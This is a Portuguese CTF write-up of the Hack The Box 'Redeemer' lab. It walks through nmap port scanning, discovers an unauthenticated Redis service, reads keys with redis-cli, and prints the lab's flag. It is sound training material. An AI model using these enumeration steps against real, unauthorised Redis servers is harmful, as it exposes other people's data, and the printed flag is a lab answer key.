# HTB - Starting Point - Redeemer

🇺🇸 [English version](./README-redeemer.md)

| Info        | Detalhe             |
|-------------|----------------------|
| Plataforma  | Hack The Box         |
| Track       | Starting Point       |
| Dificuldade | Muito Fácil          |
| OS          | Linux                |
| Status      | ✅ Resolvido          |

## Sumário
- [HTB - Starting Point - Redeemer](#htb---starting-point---redeemer)
  - [Sumário](#sumário)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lições aprendidas](#lições-aprendidas)

---

## Recon

Iniciei a máquina alvo pela plataforma do HTB, obtendo o endereço de IP do target:

**IP do alvo:** `10.129.161.106`

Em seguida, conectei na Pwnbox (máquina de ataque fornecida pelo HTB) e, através dela, me conectei na rede do target via VPN.

Rodei um scan padrão com o **Nmap** para identificar portas e serviços abertos no alvo:

```bash
nmap 10.129.161.106
```

```
Host is up (0.0066s latency).
All 1000 scanned ports on 10.129.161.106 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)
```

Nenhuma das 1000 portas mais comuns estava aberta. Tentei um scan apenas de ping para confirmar que o host ainda estava acessível:

```bash
nmap -sn 10.129.161.106
```

```
Host is up (0.0080s latency).
```

O host estava ativo, o que significava que o serviço aberto simplesmente rodava fora das 1000 portas padrão do Nmap. Tentei um SYN scan, mas ele exigia privilégios elevados que não estavam disponíveis nesse shell:

```bash
nmap -sS 10.129.161.106
```

```
You requested a scan type which requires root privileges.
QUITTING!
```

---

## Enumeration

Rodei um scan completo cobrindo todas as 65535 portas TCP para encontrar o serviço:

```bash
nmap -p- 10.129.161.106
```

```
PORT     STATE SERVICE
6379/tcp open  redis
```

A porta **6379** estava aberta, rodando **Redis** — um banco de dados chave-valor em memória que, por padrão, não exige autenticação.

---

## Exploitation

Conectei ao servidor Redis usando o `redis-cli`, especificando o host alvo com a flag `-h`:

```bash
redis-cli -h 10.129.161.106
```

Uma vez conectado, coletei informações e estatísticas sobre o servidor:

```bash
10.129.161.106:6379> INFO
```

A saída confirmou **Redis 5.0.7** rodando em Linux, em modo standalone, sem exigir autenticação para interagir com ele.

Selecionei o database de índice 0:

```bash
10.129.161.106:6379> SELECT 0
```

Verifiquei quantas chaves existiam ali dentro:

```bash
10.129.161.106:6379> DBSIZE
```

```
(integer) 4
```

Listei todas as chaves presentes:

```bash
10.129.161.106:6379> KEYS *
```

```
1) "temp"
2) "stor"
3) "numb"
4) "flag"
```

Uma das chaves se chamava `flag`. Recuperei seu valor diretamente:

```bash
10.129.161.106:6379> GET flag
```

```
"03e1d2b376c37ab3f5319922053953eb"
```

---

## Flag

```
03e1d2b376c37ab3f5319922053953eb
```

---

## Lições aprendidas

- O Redis, por padrão, não exige autenticação — qualquer pessoa que consiga alcançar a porta pode conectar, ler e modificar dados livremente, o que é uma falha grave de configuração caso exposto a redes não confiáveis.
- Nem todo serviço roda em portas conhecidas. Um scan padrão do Nmap só verifica as 1000 portas mais comuns, então um scan completo (`-p-`) cobrindo todas as 65535 portas é essencial quando um host aparenta não ter portas abertas inicialmente.
- O `redis-cli` oferece comandos simples e nativos (`INFO`, `SELECT`, `DBSIZE`, `KEYS`, `GET`) que tornam a enumeração de uma instância Redis exposta rápida e direta.
- Dados sensíveis (credenciais, tokens, flags) nunca deveriam ser armazenados sem criptografia em um banco de dados acessível sem autenticação.
